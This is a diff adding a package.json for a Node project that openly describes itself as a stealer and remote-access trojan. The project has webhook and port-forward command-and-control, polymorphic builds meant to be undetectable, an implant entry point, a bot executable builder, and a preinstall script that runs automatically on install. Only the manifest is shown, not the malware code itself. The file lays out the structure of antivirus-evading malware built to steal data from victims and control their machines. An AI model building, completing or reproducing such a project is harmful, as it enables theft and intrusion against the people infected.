@@ -1,0 +1,21 @@
+{
+  "name": "luckywarecopy",
+  "version": "2.0.0",
+  "description": "No-website stealer/RAT copy - webhook + portforward C2, polymorphic FUD builds",
+  "type": "commonjs",
+  "main": "src/implant.js",
+  "scripts": {
+    "preinstall": "node src/preinstall.js",
+    "c2": "node src/c2.js",
+    "build": "node src/builder.js",
+    "build:exe": "node src/builder.js --config config.json --out builds/bot --count 1 --exe",
+    "test": "node tools/test.js",
+    "check": "node --check src/implant.js && node --check src/c2.js && node --check src/builder.js && echo OK",
+    "build:sea": "node src/builder.js --config config.json --out builds/bot --count 1 --sea"
+  },
+  "engines": {
+    "node": ">=18"
+  },
+  "license": "UNLICENSED",
+  "dependencies": {}
+}
